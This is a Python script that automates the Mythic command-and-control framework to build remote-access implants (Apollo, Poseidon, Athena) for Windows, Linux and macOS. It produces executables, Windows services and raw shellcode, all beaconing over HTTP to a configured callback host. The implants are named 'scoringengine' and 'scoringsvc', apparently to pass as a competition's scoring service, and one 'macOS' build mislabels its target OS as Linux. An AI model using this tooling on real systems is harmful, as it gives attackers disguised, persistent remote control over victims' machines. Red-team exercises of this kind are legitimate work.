#!/usr/bin/python3

from mythic import mythic
from dotenv import load_dotenv
import asyncio, sys, os

# Load the environment file .env
load_dotenv()

# Mythic login creds
login_username = os.getenv("MYTHIC_LOGIN_USERNAME")
login_password = os.getenv("MYTHIC_LOGIN_PASSWORD")
login_server_ip = os.getenv("MYTHIC_LOGIN_SERVER_HOST")
login_server_port = os.getenv("MYTHIC_LOGIN_SERVER_PORT")

# HTTP C2 Profile information
http_callback_url = os.getenv("MYTHIC_HTTP_CALLBACK_URL")
http_callback_port = os.getenv("MYTHIC_HTTP_CALLBACK_PORT")
http_callback_killdate = os.getenv("MYTHIC_HTTP_CALLBACK_KILLDATE")

# logs into mythic to begin user creation
async def login(username: str, password: str, server_ip: str, server_port: int):
    mythic_instance = await mythic.login(
        username=username,
        password=password,
        server_ip=server_ip,
        server_port=server_port,
        timeout=-1
    )
    return mythic_instance


# Creates chonky apollo payloads based on what's passed to this function. 
# Parameter names and values are taken directly from the payload builder in the web UI
async def create_apollo_payload(mythic_instance: mythic, output_type: str, payload_name: str, payload_description: str):
    payload_response = await mythic.create_payload(
        mythic=mythic_instance,
        payload_type_name="apollo",
        filename=payload_name,
        operating_system="Windows",
        description=payload_description,
        c2_profiles=[
            {
            "c2_profile": "http",
            "c2_profile_parameters": {
                "callback_host": str(http_callback_url),
                "callback_port": str(http_callback_port),
                "callback_interval": "2",
                "callback_jitter": "70",
                "killdate": str(http_callback_killdate),
               },
            },
        ],
        build_parameters=[
            {
                "name": "output_type",
                "value": output_type
            },
            {
                "name": "debug",
                "value": False
            },
            {
                "name": "shellcode_bypass",
                "value": "Continue on fail"
            },
            {
                "name": "shellcode_format",
                "value": "Binary"
            },
            {
                "name": "adjust_filename",
                "value": False
            }
        ],
        include_all_commands=True,
        return_on_complete=True
    )
    return payload_response

# Creates chonky poseidon payloads based on what's passed to this function. 
# Parameter names and values are taken directly from the payload builder in the web UI
async def create_poseidon_payload(mythic_instance: mythic, os: str, arch: str, payload_name: str, static_linking: bool, payload_description: str):
    payload_response = await mythic.create_payload(
        mythic=mythic_instance,
        payload_type_name="poseidon",
        filename=payload_name,
        operating_system=os,
        description=payload_description,
        c2_profiles=[
            {
            "c2_profile": "http",
            "c2_profile_parameters": {
                "callback_host": str(http_callback_url),
                "callback_port": str(http_callback_port),
                "callback_interval": "2",
                "callback_jitter": "70",
                "killdate": str(http_callback_killdate),
               },
            },
        ],
        build_parameters=[
            {
                "name": "mode",
                "value": "default"
            },
            {
                "name": "architecture",
                "value": arch
            },
            {
                "name": "debug",
                "value": False
            },
            {
                "name": "garble",
                "value": False
            },
            {
                "name": "static",
                "value": static_linking
            },
            {
                "name": "egress_order",
                "value": [
                    "http",
                    "httpx",
                    "websocket",
                ]
            },
            {
                "name": "egress_failover",
                "value": "failover"
            },
            {
                "name": "failover_threshold",
                "value": 10
            },
            {
                "name": "proxy_bypass",
                "value": False
            }
        ],
        include_all_commands=True,
        return_on_complete=False
    )
    return payload_response


async def build_athena_payload(mythic_instance: mythic, os: str, arch: str, output_type: str, payload_name: str, payload_description: str):
    payload_response = await mythic.create_payload(
        mythic=mythic_instance,
        payload_type_name="athena",
        filename=payload_name,
        operating_system=os,
        description=payload_description,
        c2_profiles=[
            {
            "c2_profile": "http",
            "c2_profile_parameters": {
                "callback_host": str(http_callback_url),
                "callback_port": str(http_callback_port),
                "callback_interval": "2",
                "callback_jitter": "70",
                "killdate": str(http_callback_killdate),
               },
            },
        ],
        build_parameters=[
            {
                "name": "arch",
                "value": arch
            },
            {
                "name": "assemblyname",
                "value": payload_name
            },
            {
                "name": "compressed",
                "value": True
            },
            {
                "name": "configuration",
                "value": "Release"
            },
            {
                "name": "invariantglobalization",
                "value": False
            },
            {
                "name": "output-type",
                "value": output_type
            },
            {
                "name": "self-contained",
                "value": True
            },
            {
                "name": "single-file",
                "value": True
            },
            {
                "name": "stacktracesupport",
                "value": True
            },
            {
                "name": "trimmed",
                "value": False
            },
            {
                "name": "usesystemresourcekeys",
                "value": False
            },
        ],
        include_all_commands=True,
        return_on_complete=False
    )
    return payload_response


def main():
    # Authenticate to Mythic
    mythic_session = asyncio.run(login(username=login_username, password=login_password, server_ip=login_server_ip, server_port=login_server_port))
    print(mythic_session)

    # Create Apollo Executable
    payload_creation = asyncio.run(create_apollo_payload(mythic_instance=mythic_session, output_type="WinExe", payload_name="scoringengine.exe", payload_description="Windows x64 PE"))
    print(payload_creation)

    # Create Apollo Service Executable
    payload_creation = asyncio.run(create_apollo_payload(mythic_instance=mythic_session, output_type="Service", payload_name="scoringsvc.exe", payload_description="Windows x64 Service EXE"))
    print(payload_creation)

    # Create Apollo Shellcode
    payload_creation = asyncio.run(create_apollo_payload(mythic_instance=mythic_session, output_type="Shellcode", payload_name="apollo.bin", payload_description="Windows x64 raw shellcode"))
    print(payload_creation)

    # Create Poseidon Executable for Linux x64
    payload_creation = asyncio.run(create_poseidon_payload(mythic_instance=mythic_session, os="Linux", arch="AMD_x64", payload_name="scoringengine", static_linking=True, payload_description="Linux AMD64 ELF"))
    print(payload_creation)

    # Create Poseidon Executable for Linux ARM
    payload_creation = asyncio.run(create_poseidon_payload(mythic_instance=mythic_session, os="Linux", arch="ARM_x64", payload_name="scoringengine", static_linking=True, payload_description="Linux ARM64 ELF"))
    print(payload_creation)

    # Create Poseidon Executable for MacOS ARM (MacOS doesn't like statically compiled bins)
    payload_creation = asyncio.run(create_poseidon_payload(mythic_instance=mythic_session, os="macOS", arch="ARM_x64", payload_name="scoringengine_macos", static_linking=False, payload_description="macOS ARM64"))
    print(payload_creation)

    # Create Athena Windows Executable x64
    payload_creation = asyncio.run(build_athena_payload(mythic_instance=mythic_session, os="Windows", arch="x64", output_type="binary", payload_name="scoringengine.exe", payload_description="Windows x64 PE"))
    print(payload_creation)

    # Create Athena Windows Service Executable x64
    payload_creation = asyncio.run(build_athena_payload(mythic_instance=mythic_session, os="Windows", arch="x64", output_type="windows service", payload_name="scoringsvc.exe", payload_description="Windows x64 Service EXE"))
    print(payload_creation)

    # Create Athena Linux bin x64
    payload_creation = asyncio.run(build_athena_payload(mythic_instance=mythic_session, os="Linux", arch="x64", output_type="binary", payload_name="scoringengine", payload_description="Linux AMD64 ELF"))
    print(payload_creation)

    # Create Athena Linux bin arm64
    payload_creation = asyncio.run(build_athena_payload(mythic_instance=mythic_session, os="Linux", arch="arm64", output_type="binary", payload_name="scoringengine", payload_description="Linux ARM64"))
    print(payload_creation)

    # Create Athena MacOS bin arm64
    payload_creation = asyncio.run(build_athena_payload(mythic_instance=mythic_session, os="Linux", arch="arm64", output_type="binary", payload_name="scoringengine", payload_description="macOS ARM64"))
    print(payload_creation)

main()
sys.exit()